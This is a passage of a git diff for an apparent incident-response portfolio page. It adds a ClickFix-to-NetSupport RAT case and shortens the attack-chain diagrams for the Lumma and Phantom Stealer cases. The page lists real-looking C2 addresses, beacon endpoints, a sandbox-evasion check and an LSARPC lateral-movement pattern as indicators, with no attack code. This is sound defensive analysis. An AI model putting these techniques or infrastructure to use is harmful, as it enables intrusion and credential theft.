@@ -216,8 +216,8 @@ html,body{max-width:100%;overflow-x:hidden;}
     <h1>Hunting<br/><span class="accent">Threats</span><br/><span class="dim">in the Wire.</span></h1>
     <p class="hero-desc">PCAP analysis, malware traffic forensics, and incident response. Documenting real-world attack chains — one packet at a time.</p>
     <div class="hero-stats">
-      <div class="stat-item"><div class="stat-num">6</div><div class="stat-label">CASES</div></div>
-      <div class="stat-item"><div class="stat-num">44</div><div class="stat-label">IOCs FOUND</div></div>
+      <div class="stat-item"><div class="stat-num">7</div><div class="stat-label">CASES</div></div>
+      <div class="stat-item"><div class="stat-num">58</div><div class="stat-label">IOCs FOUND</div></div>
       <div class="stat-item stat-coming-soon">
         <div class="stat-num stat-num-dim">0</div>
         <div class="stat-label">IR REPORTS</div>
@@ -289,6 +289,14 @@ html,body{max-width:100%;overflow-x:hidden;}
       <div class="ex-tags"><span class="tag">SNAKEKEYLOGGER</span><span class="tag">TELEGRAM C2</span><span class="tag">SPAM BOT</span><span class="tag">GEO-RECON</span><span class="tag">SANDBOX EVASION</span></div>
       <div class="ex-footer"><span class="ex-iocs">Infected: 10.1.29.101 | DESKTOP-WIN11PC</span><span class="ex-arrow">→</span></div>
     </a>
+    <a href="#chain" class="exercise-card fade-in" style="transition-delay:0.5s" onclick="switchChain('ex10',document.querySelector('[data-chain=ex10]'))">
+      <div class="ex-meta"><span class="ex-date">2025-12-29</span><span class="ex-badge badge-critical">CRITICAL</span></div>
+      <div class="ex-title">ClickFix to NetSupport</div>
+      <div class="ex-subtitle">techbros.tech Domain</div>
+      <div class="ex-desc">Multi-stage ClickFix attack abusing Google Sites as initial lander. Victim tricked into executing a PowerShell stager via fake CAPTCHA. NetSupport RAT deployed fileless, with C2 beaconing and lateral movement attempt against Domain Controller.</div>
+      <div class="ex-tags"><span class="tag">NETSUPPORT RAT</span><span class="tag">CLICKFIX</span><span class="tag">FILELESS</span><span class="tag">POWERSHELL STAGER</span><span class="tag">LSARPC</span></div>
+      <div class="ex-footer"><span class="ex-iocs">Infected: 10.12.29.101 | DESKTOP-7P1B4E8</span><span class="ex-arrow">→</span></div>
+    </a>
   </div>
 </section>
 
@@ -315,6 +323,7 @@ html,body{max-width:100%;overflow-x:hidden;}
     <div class="chain-tab" onclick="switchChain('ex7',this)" data-chain="ex7">2026-02-03 — Phantom</div>
     <div class="chain-tab" onclick="switchChain('ex8',this)" data-chain="ex8">2026-02-02 — KongTuke</div>
     <div class="chain-tab" onclick="switchChain('ex9',this)" data-chain="ex9">2026-01-29 — Silent Spammer</div>
+    <div class="chain-tab" onclick="switchChain('ex10',this)" data-chain="ex10">2025-12-29 — ClickFix RAT</div>
     <div class="chain-tab chain-tab-soon disabled">New Case Coming Soon</div>
   </div>
 
@@ -406,51 +415,40 @@ html,body{max-width:100%;overflow-x:hidden;}
       </div>
     </div>
     <div class="chain-svg-wrap fade-in">
-      <svg width="100%" viewBox="0 0 320 545" style="max-height:575px">
+      <svg width="100%" viewBox="0 0 320 400" style="max-height:430px">
         <defs>
           <marker id="am5" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#253548" stroke-width="1.5" stroke-linecap="round"/></marker>
           <marker id="ar5" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#ff4757" stroke-width="1.5" stroke-linecap="round"/></marker>
         </defs>
-        <text x="308" y="8" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">19:55:23</text>
-        <g class="chain-node" onmouseenter="showTip(event,'Victim Workstation','IP: 10.2.28.88\nHostname: DESKTOP-TEYQ2NR\nUser: brolf\nDomain: easyas123.tech\nMAC: 00:19:D1:B2:4D:AD')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+        <g class="chain-node" onmouseenter="showTip(event,'Victim Workstation','IP: 10.2.28.88\nHostname: DESKTOP-TEYQ2NR\nUser: brolf\nDomain: easyas123.tech')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
           <rect x="10" y="10" width="300" height="54" rx="4" fill="#151d27" stroke="#253548" stroke-width="1"/>
           <rect x="10" y="10" width="4" height="54" rx="2" fill="#4a5568"/>
           <text x="24" y="32" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">brolf — DESKTOP-TEYQ2NR</text>
           <text x="24" y="50" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">10.2.28.88 | easyas123.tech</text>
         </g>
         <line x1="160" y1="64" x2="160" y2="96" stroke="#1e2d3d" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#am5)"/>
-        <text x="168" y="84" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568">Kerberos login</text>
-        <text x="308" y="97" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">unknown</text>
-        <g class="chain-node" onmouseenter="showTip(event,'Initial Infection Vector','Status: UNKNOWN\nReason: Malware was active before PCAP recording started\nDelivery: Suspected HTTPS encrypted channel\nNote: SIEM triggered NetSupport RAT alerts\nAll pre-C2 HTTPS traffic was legitimate Microsoft domains')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="99" width="300" height="66" rx="4" fill="#111820" stroke="#253548" stroke-width="1" stroke-dasharray="4 3"/>
-          <rect x="10" y="99" width="4" height="66" rx="2" fill="#4a5568"/>
-          <text x="24" y="121" font-family="'JetBrains Mono',monospace" font-size="11" fill="#8b949e" font-weight="500">Initial infection vector</text>
-          <text x="24" y="139" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Unknown — outside PCAP capture window</text>
-          <text x="24" y="155" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Suspected encrypted HTTPS delivery</text>
+        <g class="chain-node" onmouseenter="showTip(event,'Initial Infection Vector','Status: UNKNOWN\nMalware active before PCAP recording')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="99" width="300" height="54" rx="4" fill="#111820" stroke="#253548" stroke-width="1" stroke-dasharray="4 3"/>
+          <rect x="10" y="99" width="4" height="54" rx="2" fill="#4a5568"/>
+          <text x="24" y="121" font-family="'JetBrains Mono',monospace" font-size="11" fill="#8b949e" font-weight="500">Initial infection vector — Unknown</text>
+          <text x="24" y="139" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Outside PCAP capture window</text>
         </g>
-        <line x1="160" y1="165" x2="160" y2="197" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar5)"/>
-        <text x="308" y="198" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">19:55:51</text>
-        <g class="chain-node" onmouseenter="showTip(event,'C2 Beaconing — CMD=POLL','IP: 45.131.214.85\nEndpoint: POST /fakeurl.htm\nUser-Agent: NetSupport Manager/1.3\nContent-Type: application/x-www-form-urlencoded\nCMD=POLL: host checks in for new commands\nInterval: ~60 seconds')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="200" width="300" height="66" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
-          <rect x="10" y="200" width="4" height="66" rx="2" fill="#ff4757"/>
-          <text x="24" y="222" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">45.131.214.85 — C2 beaconing</text>
-          <text x="24" y="240" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">POST /fakeurl.htm — CMD=POLL</text>
-          <text x="24" y="256" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">NetSupport Manager/1.3 User-Agent</text>
+        <line x1="160" y1="153" x2="160" y2="185" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar5)"/>
+        <g class="chain-node" onmouseenter="showTip(event,'C2 Beaconing — CMD=POLL','IP: 45.131.214.85\nEndpoint: POST /fakeurl.htm\nUser-Agent: NetSupport Manager/1.3\nCMD=POLL: host checks in for commands')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="188" width="300" height="66" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
+          <rect x="10" y="188" width="4" height="66" rx="2" fill="#ff4757"/>
+          <text x="24" y="210" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">45.131.214.85 — C2 beaconing</text>
+          <text x="24" y="228" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">POST /fakeurl.htm — CMD=POLL</text>
+          <text x="24" y="244" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">NetSupport Manager/1.3 User-Agent</text>
         </g>
-        <line x1="160" y1="266" x2="160" y2="298" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar5)"/>
-        <text x="308" y="299" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">19:55:51+</text>
-        <g class="chain-node" onmouseenter="showTip(event,'C2 Encoded Commands — CMD=ENCD','Server response: CMD=ENCD\nES=1\nDATA=encoded payload\nMeaning: C2 sends encoded commands back\nTotal stream: 62 KB — 264 client packets\nPattern: automated persistent beaconing')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="301" width="300" height="66" rx="4" fill="#1a0808" stroke="#ff4757" stroke-width="1.5"/>
-          <rect x="10" y="301" width="4" height="66" rx="2" fill="#ff4757"/>
-          <text x="24" y="323" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">Persistent C2 — CMD=ENCD</text>
-          <text x="24" y="341" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">C2 sends encoded commands to host</text>
-          <text x="24" y="357" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Full remote control capability active</text>
+        <line x1="160" y1="254" x2="160" y2="286" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar5)"/>
+        <g class="chain-node" onmouseenter="showTip(event,'C2 Encoded Commands — CMD=ENCD','Server: CMD=ENCD + DATA=encoded\nFull remote control capability active')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="289" width="300" height="54" rx="4" fill="#1a0808" stroke="#ff4757" stroke-width="1.5"/>
+          <rect x="10" y="289" width="4" height="54" rx="2" fill="#ff4757"/>
+          <text x="24" y="311" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">Persistent C2 — CMD=ENCD</text>
+          <text x="24" y="329" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">C2 sends encoded commands to host</text>
         </g>
-        <text x="160" y="484" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e" text-anchor="middle">── Beaconing every ~60 seconds ──</text>
-        <rect x="10" y="498" width="10" height="10" fill="#4a5568" rx="1"/><text x="26" y="507" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">Victim</text>
-        <rect x="80" y="498" width="10" height="10" fill="#253548" rx="1" stroke="#4a5568" stroke-width="1" stroke-dasharray="2 2"/><text x="96" y="507" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">Unknown vector</text>
-        <rect x="200" y="498" width="10" height="10" fill="#ff4757" rx="1"/><text x="216" y="507" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">C2 activity</text>
-        <text x="160" y="532" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="middle">Hover each step for full details</text>
+        <text x="160" y="372" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="middle">Hover each step for full details</text>
       </svg>
     </div>
   </div>
@@ -459,7 +457,7 @@ html,body{max-width:100%;overflow-x:hidden;}
   <div class="chain-panel" id="chain-ex6">
     <div class="chain-info fade-in">
       <h3>Lumma in the Room-ah!</h3>
-      <p>Multi-stage Lumma Stealer attack. Payload delivered via file distribution site, followed by C2 gate contact, victim fingerprinting, data exfiltration, and LSARPC lateral movement attempt against Domain Controller — all within 83 seconds.</p>
+      <p>Multi-stage Lumma Stealer attack within 83 seconds.</p>
       <div class="chain-meta-grid">
         <div class="chain-meta-item"><div class="chain-meta-label">INFECTED HOST</div><div class="chain-meta-val">10.1.21.58</div></div>
         <div class="chain-meta-item"><div class="chain-meta-label">USER</div><div class="chain-meta-val">gwyatt</div></div>
@@ -470,62 +468,37 @@ html,body{max-width:100%;overflow-x:hidden;}
       </div>
     </div>
     <div class="chain-svg-wrap fade-in">
-      <svg width="100%" viewBox="0 0 320 545" style="max-height:575px">
-        <defs>
-          <marker id="am6" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#253548" stroke-width="1.5" stroke-linecap="round"/></marker>
-          <marker id="ar6" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#ff4757" stroke-width="1.5" stroke-linecap="round"/></marker>
-        </defs>
-        <text x="308" y="8" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">23:04:49</text>
-        <g class="chain-node" onmouseenter="showTip(event,'Victim Workstation','IP: 10.1.21.58\nHostname: DESKTOP-ES9F3ML\nUser: gwyatt\nDomain: win11office.com\nMAC: 00:21:5D:C8:0E:F2')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+      <svg width="100%" viewBox="0 0 320 400" style="max-height:430px">
+        <defs><marker id="ar6" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#ff4757" stroke-width="1.5" stroke-linecap="round"/></marker></defs>
+        <g class="chain-node" onmouseenter="showTip(event,'Victim','gwyatt — 10.1.21.58 | win11office.com')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
           <rect x="10" y="10" width="300" height="54" rx="4" fill="#151d27" stroke="#253548" stroke-width="1"/>
           <rect x="10" y="10" width="4" height="54" rx="2" fill="#4a5568"/>
           <text x="24" y="32" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">gwyatt — DESKTOP-ES9F3ML</text>
           <text x="24" y="50" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">10.1.21.58 | win11office.com</text>
         </g>
-        <line x1="160" y1="64" x2="160" y2="96" stroke="#1e2d3d" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#am6)"/>
-        <text x="168" y="84" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568">Kerberos login</text>
-        <text x="308" y="97" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">23:04:49</text>
-        <g class="chain-node" onmouseenter="showTip(event,'Initial Infection Vector','Domain: media.megafilehub4.lat\nIP: 104.21.48.156 (Cloudflare)\nProtocol: HTTPS (TLSv1.3)\nType: Payload delivery site\nDomain age: 3 months (newly registered)\nVT: BitDefender + G-Data flagged malicious')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="99" width="300" height="66" rx="4" fill="#1a1600" stroke="#3d3000" stroke-width="1"/>
-          <rect x="10" y="99" width="4" height="66" rx="2" fill="#ffa502"/>
+        <line x1="160" y1="64" x2="160" y2="96" stroke="#ffa502" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar6)"/>
+        <g class="chain-node" onmouseenter="showTip(event,'Initial Infection','media.megafilehub4.lat — Lumma Stealer delivery\nIP: 104.21.48.156 (Cloudflare)')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="99" width="300" height="54" rx="4" fill="#1a1600" stroke="#3d3000" stroke-width="1"/>
+          <rect x="10" y="99" width="4" height="54" rx="2" fill="#ffa502"/>
           <text x="24" y="121" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">media.megafilehub4.lat</text>
-          <text x="24" y="139" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ffa502">104.21.48.156 — Lumma Stealer delivery</text>
-          <text x="24" y="155" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">HTTPS encrypted — payload not observable</text>
+          <text x="24" y="139" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ffa502">Lumma Stealer payload delivery</text>
         </g>
-        <line x1="160" y1="165" x2="160" y2="197" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar6)"/>
-        <text x="168" y="185" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ff4757">1:41 min →</text>
-        <text x="308" y="198" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">23:05:34</text>
-        <g class="chain-node" onmouseenter="showTip(event,'C2 Gate — whooptm.cyou','IP: 62.72.32.156\nProtocol: HTTPS single connection\nVT: botnet_cc — Lumma Stealer confirmed\nAlias: LummaC2 Stealer\nPattern: gate/redirector — one contact only\nPurpose: delivers real C2 address')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="200" width="300" height="66" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
-          <rect x="10" y="200" width="4" height="66" rx="2" fill="#ff4757"/>
-          <text x="24" y="222" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">whooptm.cyou — C2 Gate</text>
-          <text x="24" y="240" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">62.72.32.156 — Lumma Stealer botnet_cc</text>
-          <text x="24" y="256" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Single contact — redirector to real C2</text>
+        <line x1="160" y1="153" x2="160" y2="185" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar6)"/>
+        <g class="chain-node" onmouseenter="showTip(event,'C2 Gate','whooptm.cyou — 62.72.32.156\nbotnet_cc — Lumma Stealer confirmed')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="188" width="300" height="54" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
+          <rect x="10" y="188" width="4" height="54" rx="2" fill="#ff4757"/>
+          <text x="24" y="210" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">whooptm.cyou — C2 Gate</text>
+          <text x="24" y="228" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">62.72.32.156 — single contact redirector</text>
         </g>
-        <line x1="160" y1="266" x2="160" y2="298" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar6)"/>
-        <text x="168" y="285" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ff4757">4 sec →</text>
-        <text x="308" y="299" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">23:05:39</text>
-        <g class="chain-node" onmouseenter="showTip(event,'C2 + Exfiltration — whitepepper.su','IP: 153.92.1.49 (Hostinger — AS47583)\nProtocol: HTTP (port 80) — visible!\nEndpoint: GET /api/set_agent + POST /api/set_agent\nAction: system fingerprinting + data exfiltration\nCollects: platform, userAgent, language, hardwareConcurrency\nServer: nginx/1.29.1 — title: test (hastily deployed)')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="301" width="300" height="66" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
-          <rect x="10" y="301" width="4" height="66" rx="2" fill="#ff4757"/>
-          <text x="24" y="323" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">whitepepper.su — C2 + Exfiltration</text>
-          <text x="24" y="341" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">POST /api/set_agent — system data sent</text>
-          <text x="24" y="357" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Fingerprinting: platform, UA, language</text>
+        <line x1="160" y1="242" x2="160" y2="274" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar6)"/>
+        <g class="chain-node" onmouseenter="showTip(event,'C2 + Exfil + LSARPC','whitepepper.su — POST /api/set_agent\n749 malformed lsa_OpenPolicy3 → DC')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="277" width="300" height="66" rx="4" fill="#1a0808" stroke="#ff4757" stroke-width="1.5"/>
+          <rect x="10" y="277" width="4" height="66" rx="2" fill="#ff4757"/>
+          <text x="24" y="299" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">whitepepper.su — C2 + Exfil</text>
+          <text x="24" y="317" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">POST /api/set_agent + LSARPC → DC</text>
+          <text x="24" y="333" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">749 malformed lsa_OpenPolicy3 requests</text>
         </g>
-        <line x1="160" y1="367" x2="160" y2="390" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar6)"/>
-        <text x="308" y="391" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">23:06:12</text>
-        <g class="chain-node" onmouseenter="showTip(event,'Lateral Movement — LSARPC Attack','Secondary C2: holiday-forever.cc (80.97.160.24)\nContact at 23:06:06 — 6 sec before attack\nTarget: DC 10.1.21.2\nMethod: 749 malformed lsa_OpenPolicy3 requests\nWindow: burst within ~1 second\nGoal: credential dumping / privilege escalation')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="393" width="300" height="66" rx="4" fill="#1a0808" stroke="#ff4757" stroke-width="1.5"/>
-          <rect x="10" y="393" width="4" height="66" rx="2" fill="#ff4757"/>
-          <text x="24" y="415" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">LSARPC → DC 10.1.21.2</text>
-          <text x="24" y="433" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">749 malformed lsa_OpenPolicy3 requests</text>
-          <text x="24" y="449" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Lateral movement — credential dump attempt</text>
-        </g>
-        <text x="160" y="484" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e" text-anchor="middle">── ~83 seconds: delivery → lateral movement ──</text>
-        <rect x="10" y="498" width="10" height="10" fill="#4a5568" rx="1"/><text x="26" y="507" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">Victim</text>
-        <rect x="80" y="498" width="10" height="10" fill="#ffa502" rx="1"/><text x="96" y="507" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">Init. vector</text>
-        <rect x="170" y="498" width="10" height="10" fill="#ff4757" rx="1"/><text x="186" y="507" font-family="'JetBrains Mono',monospace" font-size="9" fill="#8b949e">C2 activity</text>
-        <text x="160" y="532" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="middle">Hover each step for full details</text>
+        <text x="160" y="372" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="middle">Hover each step for full details</text>
       </svg>
     </div>
   </div>
@@ -534,7 +507,7 @@ html,body{max-width:100%;overflow-x:hidden;}
   <div class="chain-panel" id="chain-ex7">
     <div class="chain-info fade-in">
       <h3>Phantom in the Drive</h3>
-      <p>Phantom Stealer delivered via Google Drive on a Workgroup network. Malware performed sandbox evasion via ip-api.com before collecting and exfiltrating browser passwords and Thunderbird contacts over unencrypted FTP — all within ~9 seconds.</p>
+      <p>Phantom Stealer via Google Drive — ~9 seconds total.</p>
       <div class="chain-meta-grid">
         <div class="chain-meta-item"><div class="chain-meta-label">INFECTED HOST</div><div class="chain-meta-val">10.2.3.101</div></div>
         <div class="chain-meta-item"><div class="chain-meta-label">USER</div><div class="chain-meta-val">tyler</div></div>
@@ -545,65 +518,37 @@ html,body{max-width:100%;overflow-x:hidden;}
       </div>
     </div>
     <div class="chain-svg-wrap fade-in">
-      <svg width="100%" viewBox="0 0 320 580" style="max-height:620px">
-        <defs>
-          <marker id="am7" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#253548" stroke-width="1.5" stroke-linecap="round"/></marker>
-          <marker id="ar7" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#ff4757" stroke-width="1.5" stroke-linecap="round"/></marker>
-          <marker id="aa7" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#ffa502" stroke-width="1.5" stroke-linecap="round"/></marker>
-        </defs>
-        <text x="308" y="8" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">16:13:50</text>
-        <g class="chain-node" onmouseenter="showTip(event,'Victim Workstation','IP: 10.2.3.101\nHostname: DESKTOP-W7F98GR\nUser: tyler\nOS: Windows\nMAC: 00:08:02:1C:47:AE (Hewlett Packard)\nNetwork: Workgroup (no AD/DC)')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+      <svg width="100%" viewBox="0 0 320 420" style="max-height:450px">
+        <defs><marker id="ar7" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#ff4757" stroke-width="1.5" stroke-linecap="round"/></marker></defs>
+        <g class="chain-node" onmouseenter="showTip(event,'Victim','tyler — 10.2.3.101 | Workgroup')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
           <rect x="10" y="10" width="300" height="54" rx="4" fill="#151d27" stroke="#253548" stroke-width="1"/>
           <rect x="10" y="10" width="4" height="54" rx="2" fill="#4a5568"/>
           <text x="24" y="32" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">tyler — DESKTOP-W7F98GR</text>
-          <text x="24" y="50" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">10.2.3.101 | Workgroup (no domain)</text>
+          <text x="24" y="50" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">10.2.3.101 | Workgroup</text>
         </g>
-        <line x1="160" y1="64" x2="160" y2="96" stroke="#ffa502" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#aa7)"/>
-        <text x="168" y="84" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ffa502">payload download</text>
-        <text x="308" y="97" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">16:13:50</text>
-        <g class="chain-node" onmouseenter="showTip(event,'Initial Infection Vector','Domain: drive.usercontent.google.com\nIP: 142.251.186.132\nProtocol: HTTPS (TLSv1.2)\nEvidence: Bytes B→A = 270 kB\n= server sent 270 kB to tyler\n= file download confirmed\nNote: Delivery method unknown (outside PCAP)\nGoogle Drive used to bypass firewall whitelisting')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="99" width="300" height="66" rx="4" fill="#1a1600" stroke="#3d3000" stroke-width="1"/>
-          <rect x="10" y="99" width="4" height="66" rx="2" fill="#ffa502"/>
+        <line x1="160" y1="64" x2="160" y2="96" stroke="#ffa502" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar7)"/>
+        <g class="chain-node" onmouseenter="showTip(event,'Payload Delivery','drive.usercontent.google.com\n270 kB payload download')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="99" width="300" height="54" rx="4" fill="#1a1600" stroke="#3d3000" stroke-width="1"/>
+          <rect x="10" y="99" width="4" height="54" rx="2" fill="#ffa502"/>
           <text x="24" y="121" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">drive.usercontent.google.com</text>
-          <text x="24" y="139" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ffa502">142.251.186.132 — 270 kB payload download</text>
-          <text x="24" y="155" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">HTTPS encrypted — Phantom Stealer delivery</text>
+          <text x="24" y="139" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ffa502">270 kB — Phantom Stealer delivery</text>
         </g>
-        <line x1="160" y1="165" x2="160" y2="197" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar7)"/>
-        <text x="168" y="185" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ff4757">9 sec →</text>
-        <text x="308" y="198" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">16:13:59</text>
-        <g class="chain-node" onmouseenter="showTip(event,'Sandbox Evasion — Reconnaissance','Domain: ip-api.com\nIP: 208.95.112.1\nProtocol: HTTP (unencrypted)\nRequest: GET /line/?fields=hosting\nPurpose: Check if running in sandbox/datacenter\nResponse: hosting=false = real victim!\nResult: Malware continues execution\nTechnique: T1497 — Virtualization/Sandbox Evasion')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
-          <rect x="10" y="200" width="300" height="66" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
-          <rect x="10" y="200" width="4" height="66" rx="2" fill="#ff4757"/>
-          <text x="24" y="222" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">ip-api.com — Sandbox Evasion</text>
-          <text x="24" y="240" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">GET /line/?fields=hosting → hosting=false</text>
-          <text x="24" y="256" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Real victim confirmed → continue attack</text>
+        <line x1="160" y1="153" x2="160" y2="185" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar7)"/>
